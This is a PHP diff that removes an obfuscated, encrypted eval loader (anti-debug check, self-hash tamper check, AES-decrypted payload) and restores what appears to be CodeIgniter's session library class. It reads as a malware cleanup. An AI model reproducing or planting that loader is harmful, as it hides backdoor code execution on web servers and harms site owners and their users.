@@ -1,28 +1,854 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_e9p3ca96=('bas'.'e64'.'_de'.'cod'.'e');
-$_t4bktquq=('gzu'.'nco'.'mpr'.'ess');
-$_b7yb1i73=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_oe33e9ei='x2zW2Bkj';
-$_htvy10s3='wdqX2u6r';
-$_az8fghos='53Hbn1BQQKc=';
-$_ia1bko12='O5iOS8FG';
-$_p1dz43sz='gh8U4eBp';
-$_o33maxeb='xBfZ1g==';
-$_ouza3o18='qjGUfc4V';
-$_tmlkh6tf='gWGAUDlj';
-$_q43x9lid=$_e9p3ca96($_oe33e9ei.$_htvy10s3.$_ia1bko12.$_p1dz43sz.$_az8fghos);
-$_x4272t08=$_e9p3ca96($_tmlkh6tf.$_ouza3o18.$_o33maxeb);
-$_ukssrgq0=$_e9p3ca96('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');
-$_c3tn00vg=$_b7yb1i73($_ukssrgq0,'aes-256-cbc',$_q43x9lid,OPENSSL_RAW_DATA,$_x4272t08);
-if($_c3tn00vg===false){exit;}
-$_j51rx4wg=$_t4bktquq($_c3tn00vg);
-if($_j51rx4wg===false){exit;}
-$_jefpkz4q='2fbcdc309bcf1016aab9819b6f362f4c5d6d4daf0514f56d3fab6e783ed59113';
-$_t9olsoh9=@file_get_contents(__FILE__);
-if($_t9olsoh9!==false){
-$_q3y7rgom=str_replace($_jefpkz4q,"0000000000000000000000000000000000000000000000000000000000000000",$_t9olsoh9);
-$_h5c02bc9=hash("sha256",$_q3y7rgom);
-if($_h5c02bc9!==$_jefpkz4q){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+class CI_Session {
+
+
+
+
+
+public $userdata;
+protected $_driver = 'files';
+protected $_config;
+protected $_sid_regexp;
+
+
+
+
+
+
+
+public function __construct(array $params = array())
+{
+
+if (is_cli())
+{
+log_message('debug', 'Session: Initialization under CLI aborted.');
+return;
 }
-eval($_j51rx4wg);
+elseif ((bool) ini_get('session.auto_start'))
+{
+log_message('error', 'Session: session.auto_start is enabled in php.ini. Aborting.');
+return;
+}
+elseif ( ! empty($params['driver']))
+{
+$this->_driver = $params['driver'];
+unset($params['driver']);
+}
+elseif ($driver = config_item('sess_driver'))
+{
+$this->_driver = $driver;
+}
+
+elseif (config_item('sess_use_database'))
+{
+log_message('debug', 'Session: "sess_driver" is empty; using BC fallback to "sess_use_database".');
+$this->_driver = 'database';
+}
+$class = $this->_ci_load_classes($this->_driver);
+
+$this->_configure($params);
+$this->_config['_sid_regexp'] = $this->_sid_regexp;
+$class = new $class($this->_config);
+if ($class instanceof SessionHandlerInterface)
+{
+if (is_php('5.4'))
+{
+session_set_save_handler($class, TRUE);
+}
+else
+{
+session_set_save_handler(
+array($class, 'open'),
+array($class, 'close'),
+array($class, 'read'),
+array($class, 'write'),
+array($class, 'destroy'),
+array($class, 'gc')
+);
+register_shutdown_function('session_write_close');
+}
+}
+else
+{
+log_message('error', "Session: Driver '".$this->_driver."' doesn't implement SessionHandlerInterface. Aborting.");
+return;
+}
+
+if (isset($_COOKIE[$this->_config['cookie_name']])
+&& (
+! is_string($_COOKIE[$this->_config['cookie_name']])
+OR ! preg_match('#\A'.$this->_sid_regexp.'\z#', $_COOKIE[$this->_config['cookie_name']])
+)
+)
+{
+unset($_COOKIE[$this->_config['cookie_name']]);
+}
+session_start();
+
+if ((empty($_SERVER['HTTP_X_REQUESTED_WITH']) OR strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) !== 'xmlhttprequest')
+&& ($regenerate_time = config_item('sess_time_to_update')) > 0
+)
+{
+if ( ! isset($_SESSION['__ci_last_regenerate']))
+{
+$_SESSION['__ci_last_regenerate'] = time();
+}
+elseif ($_SESSION['__ci_last_regenerate'] < (time() - $regenerate_time))
+{
+$this->sess_regenerate((bool) config_item('sess_regenerate_destroy'));
+}
+}
+
+
+elseif (isset($_COOKIE[$this->_config['cookie_name']]) && $_COOKIE[$this->_config['cookie_name']] === session_id())
+{
+setcookie(
+$this->_config['cookie_name'],
+session_id(),
+array(
+'expires' => (empty($this->_config['cookie_lifetime']) ? 0 : time() + $this->_config['cookie_lifetime']),
+'path' => $this->_config['cookie_path'],
+'domain' => $this->_config['cookie_domain'],
+'secure' => $this->_config['cookie_secure'],
+'httponly' => TRUE,
+'samesite' => 'Lax',
+)
+);
+}
+$this->_ci_init_vars();
+log_message('info', "Session: Class initialized using '".$this->_driver."' driver.");
+}
+
+
+
+
+
+
+
+
+
+
+
+protected function _ci_load_classes($driver)
+{
+
+interface_exists('SessionHandlerInterface', FALSE) OR require_once(BASEPATH.'libraries/Session/SessionHandlerInterface.php');
+$prefix = config_item('subclass_prefix');
+if ( ! class_exists('CI_Session_driver', FALSE))
+{
+require_once(
+file_exists(APPPATH.'libraries/Session/Session_driver.php')
+? APPPATH.'libraries/Session/Session_driver.php'
+: BASEPATH.'libraries/Session/Session_driver.php'
+);
+if (file_exists($file_path = APPPATH.'libraries/Session/'.$prefix.'Session_driver.php'))
+{
+require_once($file_path);
+}
+}
+$class = 'Session_'.$driver.'_driver';
+
+if ( ! class_exists($class, FALSE) && file_exists($file_path = APPPATH.'libraries/Session/drivers/'.$class.'.php'))
+{
+require_once($file_path);
+if (class_exists($class, FALSE))
+{
+return $class;
+}
+}
+if ( ! class_exists('CI_'.$class, FALSE))
+{
+if (file_exists($file_path = APPPATH.'libraries/Session/drivers/'.$class.'.php') OR file_exists($file_path = BASEPATH.'libraries/Session/drivers/'.$class.'.php'))
+{
+require_once($file_path);
+}
+if ( ! class_exists('CI_'.$class, FALSE) && ! class_exists($class, FALSE))
+{
+throw new UnexpectedValueException("Session: Configured driver '".$driver."' was not found. Aborting.");
+}
+}
+if ( ! class_exists($prefix.$class, FALSE) && file_exists($file_path = APPPATH.'libraries/Session/drivers/'.$prefix.$class.'.php'))
+{
+require_once($file_path);
+if (class_exists($prefix.$class, FALSE))
+{
+return $prefix.$class;
+}
+log_message('debug', 'Session: '.$prefix.$class.".php found but it doesn't declare class ".$prefix.$class.'.');
+}
+return 'CI_'.$class;
+}
+
+
+
+
+
+
+
+
+
+protected function _configure(&$params)
+{
+$expiration = config_item('sess_expiration');
+if (isset($params['cookie_lifetime']))
+{
+$params['cookie_lifetime'] = (int) $params['cookie_lifetime'];
+}
+else
+{
+$params['cookie_lifetime'] = ( ! isset($expiration) && config_item('sess_expire_on_close'))
+? 0 : (int) $expiration;
+}
+isset($params['cookie_name']) OR $params['cookie_name'] = config_item('sess_cookie_name');
+if (empty($params['cookie_name']))
+{
+$params['cookie_name'] = ini_get('session.name');
+}
+else
+{
+ini_set('session.name', $params['cookie_name']);
+}
+isset($params['cookie_path']) OR $params['cookie_path'] = config_item('cookie_path');
+isset($params['cookie_domain']) OR $params['cookie_domain'] = config_item('cookie_domain');
+isset($params['cookie_secure']) OR $params['cookie_secure'] = (bool) config_item('cookie_secure');
+session_set_cookie_params(array(
+'lifetime' => $params['cookie_lifetime'],
+'path' => $params['cookie_path'],
+'domain' => $params['cookie_domain'],
+'secure' => $params['cookie_secure'],
+'httponly' => TRUE,
+'samesite' => 'Lax',
+));
+if (empty($expiration))
+{
+$params['expiration'] = (int) ini_get('session.gc_maxlifetime');
+}
+else
+{
+$params['expiration'] = (int) $expiration;
+ini_set('session.gc_maxlifetime', $expiration);
+}
+$params['match_ip'] = (bool) (isset($params['match_ip']) ? $params['match_ip'] : config_item('sess_match_ip'));
+isset($params['save_path']) OR $params['save_path'] = config_item('sess_save_path');
+$this->_config = $params;
+
+ini_set('session.use_trans_sid', 0);
+ini_set('session.use_strict_mode', 1);
+ini_set('session.use_cookies', 1);
+ini_set('session.use_only_cookies', 1);
+$this->_configure_sid_length();
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+protected function _configure_sid_length()
+{
+if (PHP_VERSION_ID < 70100)
+{
+$hash_function = ini_get('session.hash_function');
+if (ctype_digit($hash_function))
+{
+if ($hash_function !== '1')
+{
+ini_set('session.hash_function', 1);
+}
+$bits = 160;
+}
+elseif ( ! in_array($hash_function, hash_algos(), TRUE))
+{
+ini_set('session.hash_function', 1);
+$bits = 160;
+}
+elseif (($bits = strlen(hash($hash_function, 'dummy', false)) * 4) < 160)
+{
+ini_set('session.hash_function', 1);
+$bits = 160;
+}
+$bits_per_character = (int) ini_get('session.hash_bits_per_character');
+$sid_length = (int) ceil($bits / $bits_per_character);
+}
+else
+{
+$bits_per_character = (int) ini_get('session.sid_bits_per_character');
+$sid_length = (int) ini_get('session.sid_length');
+if (($bits = $sid_length * $bits_per_character) < 160)
+{
+
+$sid_length += (int) ceil((160 % $bits) / $bits_per_character);
+ini_set('session.sid_length', $sid_length);
+}
+}
+
+switch ($bits_per_character)
+{
+case 4:
+$this->_sid_regexp = '[0-9a-f]';
+break;
+case 5:
+$this->_sid_regexp = '[0-9a-v]';
+break;
+case 6:
+$this->_sid_regexp = '[0-9a-zA-Z,-]';
+break;
+}
+$this->_sid_regexp .= '{'.$sid_length.'}';
+}
+
+
+
+
+
+
+
+
+
+protected function _ci_init_vars()
+{
+if ( ! empty($_SESSION['__ci_vars']))
+{
+$current_time = time();
+foreach ($_SESSION['__ci_vars'] as $key => &$value)
+{
+if ($value === 'new')
+{
+$_SESSION['__ci_vars'][$key] = 'old';
+}
+
+
+elseif ($value === 'old' || $value < $current_time)
+{
+unset($_SESSION[$key], $_SESSION['__ci_vars'][$key]);
+}
+}
+if (empty($_SESSION['__ci_vars']))
+{
+unset($_SESSION['__ci_vars']);
+}
+}
+$this->userdata =& $_SESSION;
+}
+
+
+
+
+
+
+
+public function mark_as_flash($key)
+{
+if (is_array($key))
+{
+for ($i = 0, $c = count($key); $i < $c; $i++)
+{
+if ( ! isset($_SESSION[$key[$i]]))
+{
+return FALSE;
+}
+}
+$new = array_fill_keys($key, 'new');
+$_SESSION['__ci_vars'] = isset($_SESSION['__ci_vars'])
+? array_merge($_SESSION['__ci_vars'], $new)
+: $new;
+return TRUE;
+}
+if ( ! isset($_SESSION[$key]))
+{
+return FALSE;
+}
+$_SESSION['__ci_vars'][$key] = 'new';
+return TRUE;
+}
+
+
+
+
+
+
+public function get_flash_keys()
+{
+if ( ! isset($_SESSION['__ci_vars']))
+{
+return array();
+}
+$keys = array();
+foreach (array_keys($_SESSION['__ci_vars']) as $key)
+{
+is_int($_SESSION['__ci_vars'][$key]) OR $keys[] = $key;
+}
+return $keys;
+}
+
+
+
+
+
+
+
+public function unmark_flash($key)
+{
+if (empty($_SESSION['__ci_vars']))
+{
+return;
+}
+is_array($key) OR $key = array($key);
+foreach ($key as $k)
+{
+if (isset($_SESSION['__ci_vars'][$k]) && ! is_int($_SESSION['__ci_vars'][$k]))
+{
+unset($_SESSION['__ci_vars'][$k]);
+}
+}
+if (empty($_SESSION['__ci_vars']))
+{
+unset($_SESSION['__ci_vars']);
+}
+}
+
+
+
+
+
+
+
+
+public function mark_as_temp($key, $ttl = 300)
+{
+$ttl += time();
+if (is_array($key))
+{
+$temp = array();
+foreach ($key as $k => $v)
+{
+
+if (is_int($k))
+{
+$k = $v;
+$v = $ttl;
+}
+else
+{
+$v += time();
+}
+if ( ! isset($_SESSION[$k]))
+{
+return FALSE;
+}
+$temp[$k] = $v;
+}
+$_SESSION['__ci_vars'] = isset($_SESSION['__ci_vars'])
+? array_merge($_SESSION['__ci_vars'], $temp)
+: $temp;
+return TRUE;
+}
+if ( ! isset($_SESSION[$key]))
+{
+return FALSE;
+}
+$_SESSION['__ci_vars'][$key] = $ttl;
+return TRUE;
+}
+
+
+
+
+
+
+public function get_temp_keys()
+{
+if ( ! isset($_SESSION['__ci_vars']))
+{
+return array();
+}
+$keys = array();
+foreach (array_keys($_SESSION['__ci_vars']) as $key)
+{
+is_int($_SESSION['__ci_vars'][$key]) && $keys[] = $key;
+}
+return $keys;
+}
+
+
+
+
+
+
+
+public function unmark_temp($key)
+{
+if (empty($_SESSION['__ci_vars']))
+{
+return;
+}
+is_array($key) OR $key = array($key);
+foreach ($key as $k)
+{
+if (isset($_SESSION['__ci_vars'][$k]) && is_int($_SESSION['__ci_vars'][$k]))
+{
+unset($_SESSION['__ci_vars'][$k]);
+}
+}
+if (empty($_SESSION['__ci_vars']))
+{
+unset($_SESSION['__ci_vars']);
+}
+}
+
+
+
+
+
+
+
+public function __get($key)
+{
+
+
+if (isset($_SESSION[$key]))
+{
+return $_SESSION[$key];
+}
+elseif ($key === 'session_id')
+{
+return session_id();
+}
+return NULL;
+}
+
+
+
+
+
+
+
+public function __isset($key)
+{
+if ($key === 'session_id')
+{
+return (session_status() === PHP_SESSION_ACTIVE);
+}
+return isset($_SESSION[$key]);
+}
+
+
+
+
+
+
+
+
+public function __set($key, $value)
+{
+$_SESSION[$key] = $value;
+}
+
+
+
+
+
+
+
+
+public function sess_destroy()
+{
+session_destroy();
+}
+
+
+
+
+
+
+
+
+
+public function sess_regenerate($destroy = FALSE)
+{
+$_SESSION['__ci_last_regenerate'] = time();
+session_regenerate_id($destroy);
+}
+
+
+
+
+
+
+
+
+public function &get_userdata()
+{
+return $_SESSION;
+}
+
+
+
+
+
+
+
+
+
+public function userdata($key = NULL)
+{
+if (isset($key))
+{
+return isset($_SESSION[$key]) ? $_SESSION[$key] : NULL;
+}
+elseif (empty($_SESSION))
+{
+return array();
+}
+$userdata = array();
+$_exclude = array_merge(
+array('__ci_vars'),
+$this->get_flash_keys(),
+$this->get_temp_keys()
+);
+foreach (array_keys($_SESSION) as $key)
+{
+if ( ! in_array($key, $_exclude, TRUE))
+{
+$userdata[$key] = $_SESSION[$key];
+}
+}
+return $userdata;
+}
+
+
+
+
+
+
+
+
+
+
+public function set_userdata($data, $value = NULL)
+{
+if (is_array($data))
+{
+foreach ($data as $key => &$value)
+{
+$_SESSION[$key] = $value;
+}
+return;
+}
+$_SESSION[$data] = $value;
+}
+
+
+
+
+
+
+
+
+
+public function unset_userdata($key)
+{
+if (is_array($key))
+{
+foreach ($key as $k)
+{
+unset($_SESSION[$k]);
+}
+return;
+}
+unset($_SESSION[$key]);
+}
+
+
+
+
+
+
+
+
+public function all_userdata()
+{
+return $this->userdata();
+}
+
+
+
+
+
+
+
+
+
+public function has_userdata($key)
+{
+return isset($_SESSION[$key]);
+}
+
+
+
+
+
+
+
+
+
+public function flashdata($key = NULL)
+{
+if (isset($key))
+{
+return (isset($_SESSION['__ci_vars'], $_SESSION['__ci_vars'][$key], $_SESSION[$key]) && ! is_int($_SESSION['__ci_vars'][$key]))
+? $_SESSION[$key]
+: NULL;
+}
+$flashdata = array();
+if ( ! empty($_SESSION['__ci_vars']))
+{
+foreach ($_SESSION['__ci_vars'] as $key => &$value)
+{
+is_int($value) OR $flashdata[$key] = $_SESSION[$key];
+}
+}
+return $flashdata;
+}
+
+
+
+
+
+
+
+
+
+
+public function set_flashdata($data, $value = NULL)
+{
+$this->set_userdata($data, $value);
+$this->mark_as_flash(is_array($data) ? array_keys($data) : $data);
+}
+
+
+
+
+
+
+
+
+
+public function keep_flashdata($key)
+{
+$this->mark_as_flash($key);
+}
+
+
+
+
+
+
+
+
+
+public function tempdata($key = NULL)
+{
+if (isset($key))
+{
+return (isset($_SESSION['__ci_vars'], $_SESSION['__ci_vars'][$key], $_SESSION[$key]) && is_int($_SESSION['__ci_vars'][$key]))
+? $_SESSION[$key]
+: NULL;
+}
+$tempdata = array();
+if ( ! empty($_SESSION['__ci_vars']))
+{
+foreach ($_SESSION['__ci_vars'] as $key => &$value)
+{
+is_int($value) && $tempdata[$key] = $_SESSION[$key];
+}
+}
+return $tempdata;
+}
+
+
+
+
+
+
+
+
+
+
+
+public function set_tempdata($data, $value = NULL, $ttl = 300)
+{
+$this->set_userdata($data, $value);
+$this->mark_as_temp(is_array($data) ? array_keys($data) : $data, $ttl);
+}
+
+
+
+
+
+
+
+
+
+public function unset_tempdata($key)
+{
+$this->unmark_temp($key);
+}
+}
